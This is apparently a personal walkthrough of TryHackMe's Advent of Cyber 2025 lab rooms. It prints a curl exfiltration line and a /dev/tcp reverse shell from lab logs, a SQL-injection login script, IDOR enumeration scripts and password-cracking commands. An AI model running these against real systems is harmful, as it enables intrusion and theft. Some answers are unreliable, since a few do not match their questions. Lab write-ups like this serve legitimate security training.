---
title: Advent of Cyber 2025 Complete Writeup
date: 2025-12-24
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - AOC
---
 **Note:** 

- This is a combined writeup for the Advent of Cyber 2025.
- It contains answers to all the tasks and most bonus questions (not all).
- The questions are shortened for a cleaner view.
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.

---
# Linux CLI - Shells Bells

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Linux CLI

#### 1) Which CLI command would you use to list a directory?

**Ans:** `ls`

#### 2) What flag did you see inside of the McSkidy's guide?

*The question hints us to look into guides. A simple `ls` command shows us that there is a `Guides` folder. We can `cd` into it.*

*`ls` did not return anything so I decided to use `ls -a`.*

```bash
mcskidy@tbfc-web01:~/Guides$ ls -a
.  ..  .guide.txt
mcskidy@tbfc-web01:~/Guides$ cat .guide.txt 
I think King Malhare from HopSec Island is preparing for an attack.
Not sure what his goal is, but Eggsploits on our servers are not good.
Be ready to protect Christmas by following this Linux guide:

Check /var/log/ and grep inside, let the logs become your guide.
Look for eggs that want to hide, check their shells for what's inside!

P.S. Great job finding the guide. Your flag is:
-----------------------------------------------
THM{learning-linux-cli}
-----------------------------------------------
```

**Ans:** `THM{learning-linux-cli}`

#### 3) Which command helped you filter the logs for failed logins?

**Ans:** `grep `

#### 4) What flag did you see inside the Eggstrike script?

*Ensure you are in the right directory and `cat` the file.*

```bash
mcskidy@tbfc-web01:/home/socmas/2025$ cat eggstrike.sh 
# Eggstrike v0.3
# © 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"

# Your flag is:
# THM{sir-carrotbane-attacks}
```

**Ans:** `grep`

#### 5) Which command would you run to switch to the root user?

**Ans:** `sudo su`

#### 6) Finally, what flag did Sir Carrotbane leave in the root bash history?

*Switch to the root user, ensure you are in the root directory and `cat` the file.*

```bash
root@tbfc-web01:~$ ls -a
.              .bashrc.bak  .launchpadlib  .selected_editor  fix_passfrag_backups_20251111162618
..             .cache       .local         .ssh              snap
.bash_history  .config      .profile       .viminfo
.bashrc        .dbus        .profile.bak   .vnc
root@tbfc-web01:~$ cat .bash_history 
whoami
cd ~
ll 
nano .ssh/authorized_keys 
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
pkill tbfcedr
cat /etc/shadow
cat /etc/hosts
exit
```

**Ans:** `THM{until-we-meet-again}`

---

That was a bit too easy. Let's do the side quest ! 

*Viewing the file in the specified directory mentioned in the task, this is what we get:*

```bash
mcskidy@tbfc-web01:~/Documents$ cat read-me-please.txt 
From: mcskidy
To: whoever finds this

I had a short second when no one was watching. I used it.

I've managed to plant a few clues around the account.
If you can get into the user below and look carefully,
those three little "easter eggs" will combine into a passcode
that unlocks a further message that I encrypted in the
/home/eddi_knapp/Documents/ directory.
I didn't want the wrong eyes to see it.

Access the user account:
username: eddi_knapp
password: S0mething1Sc0ming

There are three hidden easter eggs.
They combine to form the passcode to open my encrypted vault.

Clues (one for each egg):

1)
I ride with your session, not with your chest of files.
Open the little bag your shell carries when you arrive.

2)
The tree shows today; the rings remember yesterday.
Read the ledger’s older pages.

3)
When pixels sleep, their tails sometimes whisper plain words.
Listen to the tail.

Find the fragments, join them in order, and use the resulting passcode
to decrypt the message I left. Be careful — I had to be quick,
and I left only enough to get help.

~ McSkidy

```

*Let's switch to the account use `su eddi_knapp` and enter the password*

*The first clue hinted something to do with shell environment so I decided to go to the user's root directory.*

```bash
eddi_knapp@tbfc-web01:~$ ls -a
.             .image_meta           .secret_git      Public
..            .lesshst              .secret_git.bak  Templates
.bash_logout  .local                .viminfo         Videos
.bashrc       .pam_environment      Desktop          fix_passfrag_backups_20251111162432
.bashrc.bak   .pam_environment.bak  Documents        wget-log
.cache        .profile              Downloads
.config       .profile.bak          Music
.gnupg        .secret               Pictures
```

*I decided to view the contents of `.bashrc` and this is what I found at the end of the file:*

```bash
# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
export PASSFRAG1="3ast3r"
```

*The first part of the password is `3ast3r`*

*The second hint is a bit hard to comprehend i'll be honest but after a lot of messing around i found a `.secret_git` directory and the whole trees and history made sense.*

*The following series of command shows what I did*

```bash
eddi_knapp@tbfc-web01:~/.secret_git/.git$ git log -p
commit e924698378132991ee08f050251242a092c548fd (HEAD -> master)
Author: mcskiddy <mcskiddy@robco.local>
Date:   Thu Oct 9 17:20:11 2025 +0000

    remove sensitive note

diff --git a/secret_note.txt b/secret_note.txt
deleted file mode 100755
index 060736e..0000000
--- a/secret_note.txt
+++ /dev/null
@@ -1,5 +0,0 @@
-========================================
-Private note from McSkidy
-========================================
-We hid things to buy time.
-PASSFRAG2: -1s-

commit d12875c8b62e089320880b9b7e41d6765818af3d
Author: McSkidy <mcskiddy@tbfc.local>
Date:   Thu Oct 9 17:19:53 2025 +0000

    add private note

diff --git a/secret_note.txt b/secret_note.txt
new file mode 100755
index 0000000..060736e
--- /dev/null
+++ b/secret_note.txt
@@ -0,0 +1,5 @@
+========================================
+Private note from McSkidy
+========================================
+We hid things to buy time.
+PASSFRAG2: -1s-
```

>`git log -p` = commit messages + all changed lines

*The second part of the password is `-1s-`*

*The third clue is very easy. The first thing that came to my mind. when I saw `pixels` is a picture.*

```bash
eddi_knapp@tbfc-web01:~/Pictures$ ls -a
.                  conference_badge.jpg  office_building.png   screenshot_2025-06-01.png
..                 easter.png            photo_meta_1.txt      scuffed_1.jpg
.easter_egg        family_holiday.jpg    photo_meta_2.txt      scuffed_2.jpg
.hidden_pic_1.png  holiday_card.jpg      photo_meta_3.txt      scuffed_3.jpg
.hidden_pic_2.png  kids_playground.jpg   profile_pic.png       vacation_beach.jpg
.hidden_pic_3.png  large_photo_1.jpg     random_image_001.png  wallpaper_autumn.png
.hidden_pic_4.png  large_photo_2.jpg     random_image_002.jpg  wallpaper_spring.png
.hidden_pic_5.png  large_photo_3.jpg     receipt_scan.jpg      work_event.png
banner_01.jpg      logo_asset.png        scenery_01.png
banner_02.png      meme_asset.png        scenery_02.jpg
eddi_knapp@tbfc-web01:~/Pictures$ cat .easter_egg 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@#+==+*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%+=+*++@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@*++**+#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@%%#*====+#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#*===-===#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@%*++:-+====*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%*===++++===-+*#######%%@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@%*+===+++==::-=========+*#%@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@%%#**+======-:-==--==-==+*%@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%*+======---=+===------=#%@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%**+=-=====-==+==-====--=*%@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@%***+++==--=====+=----=-=#@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%#**++=--=====++====----*@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@%*+=-:=++**++**+=-::--*@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@#+=:.+#***=*#=--::-=-=%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@%%*+-:+%#+++=++=:::==--*%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%*+=--*@#++===::::::::=#%@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@%%%##*#%%%####***#*#####%%@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@%%###%%%%%%%%%%##%%##%%@@@@@@@@@@@@

~~ HAPPY EASTER ~~~
PASSFRAG3: c0M1nG
```

*The second part of the password is `c0M1nG`*

*The combined password is `3ast3r-1s-c0M1nG`*

*I remembered seeing a `gpg` file in the `Documents` folder so I decided to decrypt it with the password*

```
eddi_knapp@tbfc-web01:~/Documents$ gpg --passphrase '3ast3r-1s-c0M1nG' -d mcskidy_note.txt.gpg
gpg: AES256.CFB encrypted data
gpg: encrypted with 1 passphrase
Congrats — you found all fragments and reached this file.

Below is the list that should be live on the site. If you replace the contents of
/home/socmas/2025/wishlist.txt with this exact list (one item per line, no numbering),
the site will recognise it and the takeover glitching will stop. Do it — it will save the site.

Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription

Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups

A final note — I don't know exactly where they have me, but there are *lots* of eggs
and I can smell chocolate in the air. Something big is coming.  — McSkidy

---

When the wishlist is corrected, the site will show a block of ciphertext. This ciphertext can be decrypted with the following unlock key:

UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

To decode the ciphertext, use OpenSSL. For instance, if you copied the ciphertext into a file /tmp/website_output.txt you could decode using the following command:

cat > /tmp/website_output.txt
openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in /tmp/website_output.txt -out /tmp/decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
cat /tmp/decoded_message.txt

Sorry to be so convoluted, I couldn't risk making this easy while King Malhare watches. — McSkidy
```

*I replaced the wishlist and accessed the website:*

```bash
cat > /home/socmas/2025/wishlist.txt << 'EOF'
Hardware security keys (YubiKey or similar)
Commercial password manager subscriptions (team seats)
Endpoint detection & response (EDR) licenses
Secure remote access appliances (jump boxes)
Cloud workload scanning credits (container/image scanning)
Threat intelligence feed subscription
Secure code review / SAST tool access
Dedicated secure test lab VM pool
Incident response runbook templates and playbooks
Electronic safe drive with encrypted backups
EOF
```

*The ciphertext:*
`U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=`

*I created a new file with `touch` and added the ciphertext and then proceeded to follow the instructions left in the note.*

```bash
eddi_knapp@tbfc-web01:~/Documents$ cat ciphertext.txt 
U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=
eddi_knapp@tbfc-web01:~/Documents$ openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 -in ciphertext.txt -out decoded_message.txt -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'
eddi_knapp@tbfc-web01:~/Documents$ ls
ciphertext.txt  decoded_message.txt  mcskidy_note.txt.gpg  notes_on_photos.txt
eddi_knapp@tbfc-web01:~/Documents$ cat decoded_message.txt 
Well done — the glitch is fixed. Amazing job going the extra mile and saving the site. Take this flag THM{w3lcome_2_A0c_2025}

NEXT STEP:
If you fancy something a little...spicier....use the FLAG you just obtained as the passphrase to unlock:
/home/eddi_knapp/.secret/dir

That hidden directory has been archived and encrypted with the FLAG.
Inside it you'll find the sidequest key.
```

*The flag: `THM{w3lcome_2_A0c_2025}`*

*Inside the `.secret` there was an encrypted directory which I decrypted and then extracted:*

```bash
gpg --batch --passphrase 'THM{w3lcome_2_A0c_2025}' -d dir.tar.gz.gpg | tar -xzv
```

```bash
eddi_knapp@tbfc-web01:~/.secret/dir$ ls
sq1.png
```

*I tired opening it wit h`xdg-open` but I couldn't due to permission errors. So I had to switch to `mcskidy` user then elevate my privileges to `root`. After doing so, I was able to open the image.*

*The text displayed: `now_you_see_me`*

To keep things organised, the SQ1 writeup is in a different article linked here.

---
# Phishing - Merry Clickmas

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Phishing Exercise for TBFC

#### 1) What is the password used to access the TBFC portal?

*This one is pretty straight forward, just follow the instructions given in the task and you shoud get a response in your server*

```bash
Starting server on http://0.0.0.0:8000
127.0.0.1 - - [02/Dec/2025 17:19:08] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [02/Dec/2025 17:19:08] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [02/Dec/2025 17:24:01] "GET / HTTP/1.1" 200 -
10.48.170.53 - - [02/Dec/2025 17:24:02] "GET / HTTP/1.1" 200 -
[2025-12-02 17:24:02] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.48.170.53
```

**Ans:** `unranked-wisdom-anthem`

#### 2) What is the total number of toys expected for delivery?

*Navigate to `http://10.48.170.53`, enter `factory` as the username and `unranked-wisdom-anthem` as the password.*

*Check the second mail's title for the amount.*

**Ans:** `1984000`

---
# Splunk Basics - Did you SIEM?

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Log Analysis with Splunk

#### 1) What is the attacker IP found attacking and compromising the web server?

*The Suspicious IP got by filtering is `198.51.100.55`*

**Ans:** `198.51.100.55`

#### 2) Which day was the peak traffic in the logs?

*Run the following query and use `Visualization`:*

```
index=main sourcetype=web_traffic | timechart span=1d count | sort by count | reverse
```

**Ans:** `198.51.100.55`

#### 3) What is the count of Havij user_agent events found in the logs?

*Run the following query:*

```
sourcetype="web_traffic" user_agent="Havij/1.17 (Automated SQL Injection)" 
| stats count
```

**Ans:** `993`

#### 4) How many path traversal attempts to access sensitive files...?

*The sensitive path in question is `../../` Run the following query:*

```
sourcetype=web_traffic client_ip="198.51.100.55" AND path="*..\/..\/*" | stats count by path
```

**Ans:** `658`

#### 5) How many bytes were transferred to the C2 server IP from the...?

*Run the following query:*

```
sourcetype=firewall_logs src_ip="10.10.1.5" AND dest_ip="198.51.100.55" AND action="ALLOWED" | stats sum(bytes_transferred) by src_ip
```

**Ans:** `126167`

---
# AI in Security - old sAInt nick

## Task  1 - Introduction 

No answer needed

---
## Task  2 - AI for Cyber Security Showcase

#### 1) What flag is provided in the script's output after it?

*Interact with the AI to get the script. I've pasted the script below. Make sure to enter the IP of the machine and run the script.*

```python
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

```bash
python3 script.py 
Response Status Code: 200

Response Headers:
  Date: Thu, 04 Dec 2025 18:26:06 GMT
  Server: Apache/2.4.65 (Debian)
  X-Powered-By: PHP/8.1.33
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 540
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8

Response Body:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQLi Lab</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="dashboard-body">
    <div class="dashboard-container">
        <div class="welcome-banner">
            <h1>Welcome, admin!</h1>
            <p>You have successfully logged in to the system.</p>
        </div>
        
        
        <div class="alert alert-success alert-dismissible fade show" role="alert">
            <h4 class="alert-heading">Exploit Successful!</h4>
            <hr>
            <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        
        <a href="logout.php" class="btn btn-danger">Logout</a>
    </div>
    
    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>

```

**Ans:** `THM{SQLI_EXPLOIT}`

#### 2) Complete the AI showcase by progressing through all of the stages...?

*Just keep interacting with the AI. Not too hard really.*

**Ans:** `THM{AI_MANIA}`

---
# IDOR - Santa’s Little IDOR

## Task  1 - Introduction 

No answer needed

---
## Task  2 - IDOR on the Shelf

#### 1) What does IDOR stand for? 

**Ans:** `Insecure Direct Object Reference`

#### 2) What type of privilege escalation are most IDOR cases?

**Ans:** `Horizontal`

#### 3) what is the `user_id` of the parent that has 10 children?

*I was too lazy to check each uid so I got a script made using javascript*

```javascript
(async function(){
  const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjQ5NjAxNTJ9.hpelb3QtWt-RN236_M8lotSeFLjP2hYjozPEHK5DM9A";

  for (let uid = 1; uid <= 50; uid++) {
    const res = await fetch(
      "http://10.49.130.205/api/parents/view_accountinfo?user_id=" + uid,
      {
        headers: {
          "Authorization": "Bearer " + token
        }
      }
    );

    if (!res.ok) continue;
    const data = await res.json();

    const count = (data.children || []).length;
    console.log("uid", uid, count);

    if (count === 10) {
      console.log("uid:", uid);
      console.log(data);
      break;
    }
  }
})();
```

*You can run the code on console and get the uid*

**Ans:** `15`
#### 4) Find the `id_number` of the child born on 2019-04-17?

*I was too lazy to check each uid so I got a script made using javascript...again*

```bash
(async function () {
  const token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjQ5NjAxNTJ9.hpelb3QtWt-RN236_M8lotSeFLjP2hYjozPEHK5DM9A";

  for (let id = 1; id <= 50; id++) {
    const encoded = btoa(String(id));

    const res = await fetch(
      "http://10.49.130.205/api/child/b64/" + encoded,
      {
        headers: {
          "Authorization": token
        }
      }
    );

    if (!res.ok) {
      continue;
    }

    const data = await res.json();

    if (data.birthdate === "2019-04-17") {
      console.log("Child index:", id);
      console.log("Base64:", encoded);
      console.log("Child info:", data);
      break;
    }
  }
})();
```

*You can run the code on console and get the `id_number`*

**Ans:** `19`

#### 5) **Bonus Task:** Want to go even further?

*Haven't come around to solve this one yet...*

---
# Malware Analysis - Egg-xecutable

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Malware Analysis Using Sandboxes 

*For most of these questions just follow the instructions given in the task*

#### 1) What is the SHA256Sum of the HopHelper.exe?

**Ans:** `F29C270068F865EF4A747E2683BFA07667BF64E768B38FBB9A2750A3D879CA33`

#### 2) What is that flag value?

*Sorting the `size (bytes)` column in descending order makes this easier.*

**Ans:** `THM{STRINGS_FOUND}`

#### 3)  What registry value has the HopHelper.exe modified for persistence?

*Just a tip, do not select html as the format for logs, this the formatting is all messed up. I tried looking for the `HopHelper` in the logs and that narrowed things down.*

**Ans:** `HKU\S-1-5-21-1966530601-3185510712-10604624-1008\Software\Microsoft\Windows\CurrentVersion\Run\HopHelper`

#### 4) What network protocol is HopHelper.exe using to communicate?

*I filtered for `TCP Connect` and this is what I found:*

```
breachblocker-sandbox:49961 -> breachblocker-sandbox:http
```

**Ans:** `http`

---
# Network Discovery - Scan-ta Clause

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Discover Network Services 

#### 1) What evil message do you see on top of the website?

*Conduct the `nmap` scan and visit the website on port `80` *

```bash
nmap 10.48.158.111
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-07 16:30 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.48.158.111
Host is up (0.00067s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Ans:** `Pwned by HopSec`

#### 2) What is the first key part found on the FTP server?

*Conduct the `nmap` scan and `FTP` into the server on the port `21212`*

```bash
nmap -p- --script=banner  10.48.158.111
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-07 16:36 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.48.158.111
Host is up (0.00033s latency).
Not shown: 65531 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
|_banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
80/tcp    open  http
21212/tcp open  trinket-agent
|_banner: 220 (vsFTPd 3.0.5)
25251/tcp open  unknown
|_banner: TBFC maintd v0.2\x0AType HELP for commands.
```

*You can follow the commands here to view the file contents:*

```bash
ftp 10.48.158.111 21212
Connected to 10.48.158.111.
220 (vsFTPd 3.0.5)
Name (10.48.158.111:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get tbfc_qa_key1 -
remote: tbfc_qa_key1
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for tbfc_qa_key1 (13 bytes).
KEY1:3aster_
226 Transfer complete.
13 bytes received in 0.00 secs (28.0250 kB/s)
ftp> 
```

**Ans:** `3aster_`
#### 3) What is the second key part found in the TBFC app?

*Just a tip here - If you get `not armed` when you type `GET KEY` just reconnect.*

```bash
root@ip-10-48-76-53:~# nc -v 10.48.158.111 25251
Connection to 10.48.158.111 25251 port [tcp/*] succeeded!
TBFC maintd v0.2
Type HELP for commands.
HELP
Commands: HELP, STATUS, GET KEY, QUIT
GET KEY
KEY2:15_th3_
```

**Ans:** `15_th3_`
#### 4) What is the third key part found in the DNS records?

```bash
root@ip-10-48-76-53:~# dig @10.48.158.111 TXT key3.tbfc.local +short
"KEY3:n3w_xm45"
```

*Since THM, didn't really elaborate on what this does here's. a little more info:*

>It sends a DNS query to the server **10.48.158.111** asking for the **TXT record** of the domain **key3.tbfc.local**, and the `+short` flag makes the output show only the TXT response instead of the full detailed dig results.

**Ans:** `n3w_xm45`

*Combined key - `3aster_15_th3_n3w_xm45`*

#### 5) Which port was the MySQL database running on?

**Ans:** `3306`
#### 6) Finally, what's the flag you found in the database?

```bash
tbfcapp@tbfc-devqa01:~$ mysql -D tbfcqa01 -e "show tables"                                                               
+--------------------+                                                                                                   
| Tables_in_tbfcqa01 |                                                                                                   
+--------------------+                                                                                                   
| flags              |                                                                                                   
+--------------------+                                                                                                   
tbfcapp@tbfc-devqa01:~$ mysql -D tbfcqa01 -e "select * from flags"                                                       
+----+------------------------------+                                                                                    
| id | flag                         |                                                                                    
+----+------------------------------+                                                                                    
|  1 | THM{4ll_s3rvice5_d1sc0vered} |                                                                                    
+----+------------------------------+                                                  
```

**Ans:** `THM{4ll_s3rvice5_d1sc0vered}`

---
# Network Discovery - Scan-ta Clause

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Discover Network Services 

#### 1) What is the flag provided when SOC-mas is restored in the calendar?

*This is a pretty straight forward room, just follow the instructions*

**Ans:** `THM{XMAS_IS_COMING__BACK}`

---
# Passwords - A Cracking Christmas

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Attacks Against Encrypted Files

#### 1) What is the flag inside the encrypted PDF?

*Cracking the password via the wordlist:*

```bash
ubuntu@tryhackme:~/Desktop$ pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt 
PDF version 1.7
Security Handler: Standard
V: 2
R: 3
P: -1060
Length: 128
Encrypted Metadata: True
FileID: 3792b9a3671ef54bbfef57c6fe61ce5d
U: c46529c06b0ee2bab7338e9448d37c3200000000000000000000000000000000
O: 95d0ad7c11b1e7b3804b18a082dda96b4670584d0044ded849950243a8a367ff
found user-password: 'naughtylist'
```

*I just opened the file and entered the cracked password.*

**Ans:** `THM{Cr4ck1ng_PDFs_1s_34$y}`

#### 2) What is the flag inside the encrypted zip file?

*I created a hashed text and used `john` to crack the hash:*

```bash
ubuntu@tryhackme:~/Desktop$ zip2john flag.zip > ziphash.txt
ubuntu@tryhackme:~/Desktop$ cat ziphash.txt 
flag.zip/flag.txt:$zip2$*0*3*0*db58d2418c954f6d78aefc894faebf54*d89c*1d*b8370111f4d9eba3ca5ff6924f8c4ff8636055dce00daec2679f57bde1*57445596ac0bc2a29297*$/zip2$:flag.txt:flag.zip:flag.zip
ubuntu@tryhackme:~/Desktop$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size [KiB]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
winter4ever      (flag.zip/flag.txt)     
1g 0:00:00:00 DONE (2025-12-09 17:45) 2.326g/s 9525p/s 9525c/s 9525C/s friend..sahara
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

*The password: `winter4ever`*

*I then used the password to extract the zip file. If you decided to use `unzip` (like me) then you would have come across the `unsupported compression method`. Just use the GUI to do it instead.*

**Ans:** `THM{Cr4ck1n6_z1p$_1s_34$yyyy}`

---
# SOC Alert Triage - Tinsel Triage

## Task  1 - 3

No answer needed

---
## Task  4 - Investigation Proper

#### 1) How many entities are affected by the **Linux PrivEsc - Polkit Exploit Attempt** alert?

*Looking at the `inux PrivEsc - Polkit Exploit Attempt` incident and  `Assets` field:*

**Ans:** `10`

#### 2) What is the severity of the **Linux PrivEsc - Sudo Shadow Access** alert?

*I checked the. `Severity` field*

**Ans:** `High`

#### 3) How many accounts were added to the sudoers group in the...?

*This was visible in the  `View full details` drop down.*

**Ans:** `4`

---
## Task  5 - Diving Deeper Into Logs

#### 1) What is the name of the kernel module installed in websrv-01?

*I used the provided query:*

```
set query_now = datetime(2025-10-30T05:09:25.9886229Z);  
Syslog_CL  
| where host_s == 'websrv-01'  
| project _timestamp_t, host_s, Message
```

**Ans:** `malicious_mod.ko`

#### 2) What is the unusual command executed within websrv-01 by the ops user?

*I checked the. `Severity` field*

**Ans:** `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1`

#### 3) What is the source IP address of the first successful SSH login to storage-01?

*This was visible in the  `View full details` drop down.*

**Ans:** `172.16.0.12`
#### 4) What is the external source IP that successfully logged in as root to app-01?

*The query I used:*

```
Syslog_CL  
| where host_s == 'app-01'  
| project _timestamp_t, host_s, Message
```

**Ans:** `203.0.113.45`

#### 5) Aside from the backup user, what is the name of the user...?

*This was visible in the  `View full details` drop down.*

**Ans:** `deploy`

---
# XSS - Merry XSSmas

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Discover Network Services 

#### 1) Which type of XSS attack requires payloads to be persisted on the backend?

